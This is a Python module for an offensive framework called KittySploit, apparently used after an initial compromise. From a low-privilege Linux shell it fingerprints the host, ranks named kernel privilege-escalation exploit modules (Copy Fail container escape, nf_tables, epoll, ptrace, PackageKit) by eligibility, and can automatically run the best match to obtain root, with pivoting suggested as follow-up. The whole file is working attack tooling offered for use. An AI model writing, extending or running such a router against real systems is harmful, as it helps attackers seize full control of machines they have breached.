#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Probe Linux kernel LPE candidates (2026) and optionally run the best match."""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Optional, Tuple

from kittysploit import *
from lib.post.linux.session import LinuxSessionMixin


@dataclass(frozen=True)
class _Candidate:
    path: str
    cve: str
    title: str
    priority: int
    probe: str  # key into _PROBE_FUNCS


class Module(Post, LinuxSessionMixin):
    __info__ = {
        "name": "Linux Kernel LPE Router (CVE-2026)",
        "description": (
            "From a low-privilege Linux shell, scores public 2026 kernel LPE modules "
            "(Copy Fail, bad_epoll, nf_tables catch-all, ptrace, PackageKit, etc.) "
            "and optionally runs the highest-priority eligible module on this session."
        ),
        "author": ["KittySploit Team"],
        "platform": [Platform.LINUX],
        "session_type": [
            SessionType.SHELL,
            SessionType.SSH,
            SessionType.METERPRETER,
            SessionType.PHP,
            SessionType.WEBSHELL,
        ],
        "tags": ["linux", "lpe", "kernel", "router", "cve-2026"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "privilege_escalation"],
            "expected_requests": 8,
            "reversible": False,
            "approval_required": True,
            "produces": ["root", "risk_signals"],
            "requires": {"capabilities_any": ["shell", "rce"]},
            "chain": {
                "consumes_capabilities": ["shell"],
                "produces_capabilities": ["root"],
                "suggested_followups": [
                    "post/shell/linux/manage/elevate_session",
                    "post/shell/multi/manage/pivot_autoroute",
                ],
            },
        },
    }

    auto_run = OptBool(False, "Run the top eligible LPE module (not just list)", required=False)
    module_path = OptString(
        "",
        "Force a catalog path (overrides auto_run ranking)",
        required=False,
    )
    include_legacy_nf_tables = OptBool(
        True,
        "Include CVE-2024-1086 nf_tables fallback when 2026 modules are unlikely",
        required=False,
    )

    _CANDIDATES: Tuple[_Candidate, ...] = (
        _Candidate(
            "post/shell/linux/exploits/copy_fail_docker_escape_cve_2026_31431",
            "CVE-2026-31431",
            "Copy Fail container escape (modprobe)",
            100,
            "docker_copy_fail",
        ),
        _Candidate(
            "post/shell/linux/exploits/copy_fail_cve_2026_31431",
            "CVE-2026-31431",
            "Copy Fail host LPE (AF_ALG page cache)",
            90,
            "copy_fail",
        ),
        _Candidate(
            "post/shell/linux/exploits/bad_epoll_cve_2026_46242",
            "CVE-2026-46242",
            "bad_epoll epoll UAF",
            80,
            "generic_x64",
        ),
        _Candidate(
            "post/shell/linux/exploits/nft_catchall_cve_2026_23111",
            "CVE-2026-23111",
            "nf_tables catch-all UAF",
            75,
            "nf_tables",
        ),
        _Candidate(
            "post/shell/linux/exploits/ptrace_cred_steal_cve_2026_4633",
            "CVE-2026-4633",
            "ptrace credential steal",
            70,
            "generic_x64",
        ),
        _Candidate(
            "post/shell/linux/exploits/cve_2026_41651",
            "CVE-2026-41651",
            "PackageKit TOCTOU",
            65,
            "packagekit",
        ),
        _Candidate(
            "post/shell/linux/exploits/nf_tables_cve_2024_1086_lpe",
            "CVE-2024-1086",
            "nf_tables double-free (legacy fallback)",
            50,
            "nf_tables",
        ),
    )

    def check(self):
        if not self.linux_require_linux():
            return False
        uid = (self.linux_execute("id -u 2>/dev/null", pty=False) or "").strip()
        if uid == "0":
            print_success("Session is already root (uid=0).")
            return True
        return True

    def _sid(self) -> str:
        return self._linux_sid()

    def _context(self) -> Dict[str, str]:
        return {
            "uid": (self.linux_execute("id -u 2>/dev/null", pty=False) or "").strip(),
            "arch": (self.linux_execute("uname -m 2>/dev/null", pty=False) or "").strip().lower(),
            "kernel": (self.linux_execute("uname -r 2>/dev/null", pty=False) or "").strip(),
            "userns": (
                self.linux_execute("cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null", pty=False)
                or ""
            ).strip(),
            "nft": (self.linux_execute("lsmod 2>/dev/null | grep -E '^nf_tables'", pty=False) or "").strip(),
            "docker": (
                self.linux_execute(
                    "test -f /.dockerenv && echo docker || (grep -qa docker /proc/1/cgroup 2>/dev/null && echo docker)",
                    pty=False,
                )
                or ""
            ).strip(),
            "python": (
                self.linux_execute(
                    "command -v python3 2>/dev/null || command -v python 2>/dev/null || true",
                    pty=False,
                )
                or ""
            ).strip(),
            "pkexec": (self.linux_execute("command -v pkexec 2>/dev/null || true", pty=False) or "").strip(),
        }

    def _probe_generic_x64(self, ctx: Dict[str, str]) -> Tuple[bool, str]:
        if ctx.get("uid") == "0":
            return False, "already root"
        arch = ctx.get("arch") or ""
        if arch not in ("x86_64", "amd64"):
            return False, f"unsupported arch {arch or '?'}"
        return True, "x86_64 host user — PoC may apply (kernel-specific)"

    def _probe_nf_tables(self, ctx: Dict[str, str]) -> Tuple[bool, str]:
        ok, reason = self._probe_generic_x64(ctx)
        if not ok:
            return ok, reason
        if ctx.get("userns") == "0":
            return False, "unprivileged_userns_clone disabled"
        if not ctx.get("nft"):
            return False, "nf_tables not loaded"
        return True, "nf_tables + user namespaces look usable"

    def _probe_packagekit(self, ctx: Dict[str, str]) -> Tuple[bool, str]:
        if ctx.get("uid") == "0":
            return False, "already root"
        if not ctx.get("pkexec"):
            return False, "pkexec / PackageKit not found on PATH"
        return True, "PackageKit tooling present"

    def _probe_docker_copy_fail(self, ctx: Dict[str, str]) -> Tuple[bool, str]:
        if ctx.get("uid") == "0":
            return False, "already root"
        if "docker" not in (ctx.get("docker") or ""):
            return False, "not inside a Docker-style container"
        if not ctx.get("python"):
            return False, "python required for Copy Fail stub"
        return True, "container context — modprobe escape chain may apply"

    def _probe_copy_fail(self, ctx: Dict[str, str]) -> Tuple[bool, str]:
        if ctx.get("uid") == "0":
            return False, "already root"
        if "docker" in (ctx.get("docker") or ""):
            return False, "prefer container escape module"
        if not ctx.get("python"):
            return False, "python required for Copy Fail check stub"
        return self._module_check("post/shell/linux/exploits/copy_fail_cve_2026_31431")

    def _probe_fns(self) -> Dict[str, Callable[[Dict[str, str]], Tuple[bool, str]]]:
        return {
            "generic_x64": self._probe_generic_x64,
            "nf_tables": self._probe_nf_tables,
            "packagekit": self._probe_packagekit,
            "docker_copy_fail": self._probe_docker_copy_fail,
            "copy_fail": self._probe_copy_fail,
        }

    def _module_check(self, path: str) -> Tuple[bool, str]:
        if not self.framework or not getattr(self.framework, "module_loader", None):
            return False, "framework module_loader unavailable"
        sid = self._sid()
        mod = self.framework.module_loader.load_module(path, framework=self.framework)
        if not mod:
            return False, "module not found in catalog"
        mod.set_option("session_id", sid)
        if not hasattr(mod, "check"):
            return True, "no check() — assumed eligible"
        try:
            result = mod.check()
        except Exception as exc:
            return False, f"check failed: {exc}"
        if result is True:
            return True, "module check() passed"
        if result is False:
            return False, "module check() rejected target"
        if isinstance(result, dict):
            if result.get("vulnerable"):
                return True, str(result.get("reason") or "check reported vulnerable")
            return False, str(result.get("reason") or "check reported not vulnerable")
        return bool(result), "module check returned non-boolean"

    def _rank(self, ctx: Dict[str, str]) -> List[Dict[str, Any]]:
        probes = self._probe_fns()
        rows: List[Dict[str, Any]] = []
        for cand in sorted(self._CANDIDATES, key=lambda c: -c.priority):
            if cand.cve == "CVE-2024-1086" and not bool(self.include_legacy_nf_tables):
                continue
            fn = probes.get(cand.probe)
            if not fn:
                eligible, reason = False, f"unknown probe {cand.probe}"
            else:
                eligible, reason = fn(ctx)
            rows.append(
                {
                    "path": cand.path,
                    "cve": cand.cve,
                    "title": cand.title,
                    "priority": cand.priority,
                    "eligible": eligible,
                    "reason": reason,
                }
            )
        return rows

    def _run_module(self, path: str) -> bool:
        if not self.framework or not getattr(self.framework, "module_loader", None):
            print_error("Framework module_loader unavailable")
            return False
        sid = self._sid()
        mod = self.framework.module_loader.load_module(path, framework=self.framework)
        if not mod:
            print_error(f"Could not load module: {path}")
            return False
        mod.set_option("session_id", sid)
        print_status(f"Running {path} on session {sid}...")
        try:
            result = mod.run()
        except Exception as exc:
            print_error(f"Module run failed: {exc}")
            return False
        if result is False:
            print_warning(f"Module reported failure: {path}")
            return False
        return True

    def run(self):
        if not self.check():
            return False
        sid = self._sid()
        if not sid:
            print_error("Session ID is required")
            return False

        ctx = self._context()
        if ctx.get("uid") == "0":
            print_success("Already root — no kernel LPE required.")
            return True

        print_info("=" * 72)
        print_status("Kernel LPE router (CVE-2026 family)")
        print_info(f"  kernel : {ctx.get('kernel') or '?'}")
        print_info(f"  arch   : {ctx.get('arch') or '?'}")
        print_info(f"  uid    : {ctx.get('uid') or '?'}")
        if ctx.get("docker"):
            print_info(f"  container: {ctx.get('docker')}")

        ranked = self._rank(ctx)
        eligible = [r for r in ranked if r["eligible"]]

        print_info("-" * 72)
        print_status("Candidate modules (highest priority first)")
        for row in ranked:
            flag = "YES" if row["eligible"] else "no"
            print_info(f"  [{flag}] {row['cve']} — {row['title']}")
            print_info(f"         {row['path']}")
            print_info(f"         → {row['reason']}")

        forced = str(self.module_path or "").strip()
        if forced:
            print_status(f"Forced module: {forced}")
            return self._run_module(forced)

        if not bool(self.auto_run):
            if eligible:
                top = eligible[0]
                print_info("-" * 72)
                print_status(
                    f"Top pick: {top['cve']} ({top['path']}). "
                    "Set auto_run=true to execute."
                )
            else:
                print_warning("No eligible 2026 kernel LPE modules for this target.")
                print_info("Try post/shell/multi/gather/privesc_suggester for generic paths.")
            return True

        if not eligible:
            print_error("auto_run set but no eligible module — aborting.")
            return False

        top = eligible[0]
        print_success(f"auto_run → {top['cve']} ({top['path']})")
        return self._run_module(top["path"])
